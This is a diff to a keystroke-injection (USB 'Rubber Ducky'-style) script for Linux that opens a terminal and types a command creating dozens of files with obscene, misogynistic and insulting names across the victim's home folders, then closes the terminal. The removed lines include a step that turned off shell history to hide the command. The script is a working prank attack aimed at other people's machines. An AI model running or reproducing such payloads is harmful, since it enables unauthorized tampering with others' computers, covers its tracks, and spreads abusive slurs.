@@ -12,16 +12,9 @@ REM Minimize all windows as that ensures launch happens smoother.
 WINDOWS d
 DELAY 300
 CTRL-ALT t
-REM adjust delay as needed
 DELAY 1500
-REM sneak +1 don't delete the whole history or mess with settings, just turn history off and delete the last entry ;)
-STRING set +o history
-DELAY 200
-ENTER
-DELAY 200
 STRING nohup cd /Home/Pictures && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd /Home/Documents && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd /Home/Music && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd /Home/Videos && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd /Home/Desktop && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain && cd .. && touch 2-faced stupid jerk dunce dipstick dork bonehead dingbat jackass mouth-breather dumb ugly fat whore slut fuck-stick poopoo_breath cum_dumpster fart_breath ass_eater turd_burglar butt_munch crap_monster turd_face shit_stain shit_eater asshat asshole fuck_stick slut whore cunt dickhead shit_weasel prick motherfucker whorebag dickwad fucktard shitstain butt_pirate skank_fuck whore_monger dickwad shit_stain &
-STRING cd ..
-DELAY 500
+DELAY 2000
 ENTER
 DELAY 1000
 CTRL C
@@ -29,4 +22,3 @@ DELAY 500
 STRING exit
 DELAY 200
 ENTER
-REM to make your friends not hate you replace touch with rm, so basically do it in reverse with rm. Will add those versions later when I get time.
